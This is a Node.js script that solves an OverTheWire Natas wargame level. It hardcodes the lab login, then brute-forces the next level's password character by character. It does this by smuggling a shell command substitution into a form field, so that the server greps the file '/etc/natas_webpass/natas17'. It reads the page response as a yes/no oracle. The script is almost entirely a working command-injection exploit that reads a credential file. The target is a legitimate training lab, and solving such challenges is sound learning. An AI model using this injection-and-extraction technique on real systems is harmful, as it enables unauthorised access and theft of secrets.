let username = 'natas16';
let password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh';


const request = require('request'),
      fs = require('fs'),
      $ = require('cheerio'); 
      rp = require('request-promise').defaults({transform : autoParse});
 
function autoParse(body, response) {
    if (response.headers['content-type'].includes('application/json')) {
        return JSON.parse(body);
    } else if (response.headers['content-type'].includes('text/html')) {
        return $.load(body);
    } else {
        return body;
    }
}

let characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    .split('');

function bruteForce(currentPassword){
    if(currentPassword.length == 32)
        console.log('PASSWORD: ' + currentPassword);
    characters.forEach(char => {
        let newPassword = currentPassword + char;
        let options = {
            uri: `http://${username}.natas.labs.overthewire.org`,
            method: 'POST',
            formData: {
                needle: `anythings$(grep ^${newPassword} /etc/natas_webpass/natas17)` 
            }
        }
        rp(options)
            .auth(username, password)
            .then($ => {
                if(!$.text().includes("anythings")){
                    console.log('found char:' + newPassword)
                    bruteForce(newPassword);
                }
            });
    });
}

bruteForce('');
